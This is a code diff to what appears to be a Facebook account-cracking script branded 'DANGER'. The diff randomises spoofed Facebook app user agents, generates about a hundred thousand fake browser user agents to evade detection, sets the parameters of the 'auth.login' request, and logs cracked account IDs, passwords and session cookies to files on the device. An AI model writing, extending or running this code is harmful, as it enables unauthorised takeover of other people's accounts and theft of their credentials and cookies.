@@ -271,22 +271,59 @@ srange = 0
 saved = []
 totaldmp = 0
 filter = []
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
 def randBuildLSB():
     vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
     VAPP = random.randint(410000000,499999999)
-    END = '[FBAN/FB4A;FBAV/76.0.0.7677;FBBV/5559051;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    END = '[FBAN/FB4A;FBAV/303.0.0.3.124;FBBV/533556795;FBDM/{density=2.3,width=1080,height=1478};FBLC/en_GB;FBRV/968917366;FBCR/Jazz;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2003J15SC;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/SP1A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
 
 def randFBAN():
   VAPP = random.randint(410000000,499999999)
-  ua="[FBAN/FB4A;FBAV/68.0.0.3593;FBBV/"+str(VAPP)+";FBDM/{density=2.5,width=780,height=1920};FBLC/fr_IN;FBRV/4214899694;FBCR/1030;FBMF/Realme;FBBD/Ostin;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/16;FBOP/5;FBCA/arm64-v8a:;]"
+  ua="[FBAN/FB4A;FBAV/384.0.0.8.140;FBBV/"+str(VAPP)+";FBDM/{density=3.3,width=1080,height=1458};FBLC/en_US;FBRV/974470275;FBCR/Vi India;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/"+random.choice(model2)+";FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
   return ua
 
 def randBuildvsskj():
-    END = '[FBAN/FB4A;FBAV/49.0.0.4120;FBBV/9006006;[FBAN/FB4A;FBAV/352.0.0.21.117;FBBV/348184932;FBDM/{density=3.0,width=1080,height=2102};FBLC/en_IN;FBRV/0;FBCR/MLS;FBMF/Magic;FBBD/Magic;FBPN/com.facebook.katana;FBDV/iQ3204;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
+    END = '[FBAN/FB4A;FBAV/201.0.0.4.185;FBBV/721475978;FBDM/{density=3.2,width=1080,height=1430};FBLC/en_GB;FBRV/549098911;FBCR/Jazz;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
     ua = f'Dalvik/2.1.0 (Linux; U; Android {random.randint(4,13)}; {random.choice(model2)} Build/DANGER2A.{random.randint(111111,999999)}.{random.randint(111,999)}) '+END
     return ua
+    
+for agent in range(random.randint(89999, 100000)):
+    a='Mozilla/5.0 (iPod/'
+    aa=random.choice(['7.1','8.0','9.2','10.3','11.4','12.5','13.2','14.7','15.1','16.0'])
+    a1='; CPU iPhone OS'
+    b=random.choice(['3_1','3_2','3_3','16_5','13_4','3_0','4_0','15_0','11_0','12_1','13_3','14_2'])
+    n='like Mac OS X)'
+    c=random.randrange(7,12)
+    m='en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(100,999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/'
+    o=random.randrange(533,605)
+    p='1'
+    q=random.randrange(10,99)
+    r='(KHTML, like Gecko) Chrome/'
+    h=random.randrange(10,99)
+    i='0'
+    j=random.randrange(1000,9999)
+    k=random.randrange(10,99)
+    l='GSA/'
+    ll=random.randrange(155,159)
+    l1=random.randrange(1,9)
+    l2=random.randrange(111111111,999999999)
+    l3='Mobile/'
+    l4=random.choice(['18C79','18B92','18A374','17D47','16E23','15F91','14G60','13H15','12I82','11J33','10K04','09L78'])
+    l5='Safari/'
+    s=random.randrange(535,605)
+    t=random.randrange(1,9)
+    fullagent=f'{a}{aa}{a1} {b} {n} {c};  {m}{d}{e}{f}) {g}{o}.{p}.{q} {r}{h}.{i}.{j}.{k} {l}{ll}.{l1}.{l2} {l3}{l4} {l5}{s}.{t}'
+    ugen.append(fullagent)
 
 sys.stdout.write('\x1b]2; DANGER\x07')
 S = '\033[1;37m'
@@ -418,8 +455,8 @@ class main_crack():
 "meta_inf_fbmeta": "",
 "advertiser_id": str(uuid.uuid4()),
 "currently_logged_in_userid": "0",
-"locale": "fr_IN",
-"client_country_code": "NP",
+"locale": "fr_US",
+"client_country_code": "US",
 "method": "auth.login",
 "fb_api_req_friendly_name": "authenticate",
 "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
@@ -447,7 +484,7 @@ class main_crack():
                     open('/sdcard/DANGER_OK_ids_M1.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/DANGER_iDs_COOKiEs_M1.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                     #print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
+                     print(f"\r{A} [DANGER-CP] {sid} | {ps} {S}")
                      cps.append(sid)
                      open('/sdcard/DANGER_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
